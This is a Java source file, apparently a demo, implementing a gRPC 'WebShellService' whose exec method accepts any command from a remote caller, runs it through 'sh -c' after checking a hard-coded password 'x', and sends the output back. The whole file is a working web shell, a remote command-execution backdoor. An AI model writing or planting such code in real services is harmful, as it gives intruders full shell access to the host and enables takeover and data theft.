package com.demo.shell.service;

import com.demo.shell.protocol.WebShellServiceGrpc;
import com.demo.shell.protocol.Webshell;
import io.grpc.stub.StreamObserver;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

//@GrpcService
public class WebshellServiceImpl extends WebShellServiceGrpc.WebShellServiceImplBase {

    @Override
    public void exec(Webshell request, StreamObserver<Webshell> responseObserver) {
//        super.exec(request, responseObserver);
        String pwd = request.getPwd();
        String cmd = request.getCmd();

        if ("x".equals(pwd)) {
            String[] cmdStrings = new String[]{"sh", "-c", cmd};
            String retString = "";

            Process p = null;
            try {
                p = Runtime.getRuntime().exec(cmdStrings);
                int status = p.waitFor();
                List<String> processList = new ArrayList<String>();

                BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line = "";
                while ((line = input.readLine()) != null) {
                    processList.add(line);
                }
                input.close();
                line = "";
                for (String l : processList) {
                    line += l;
                }
                System.out.println(line);

//                String result = p.getOutputStream().toString();
                System.out.println("=======>" + line);
                if (status != 0) {
                    System.err.println(String.format("runShellCommand: %s, status: %s", cmd, status));
                }

                Webshell webshell = Webshell.newBuilder().setCmd(line).build();
                responseObserver.onNext(webshell);
                responseObserver.onCompleted();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (p != null) {
                    p.destroy();
                }
            }
        }
    }
}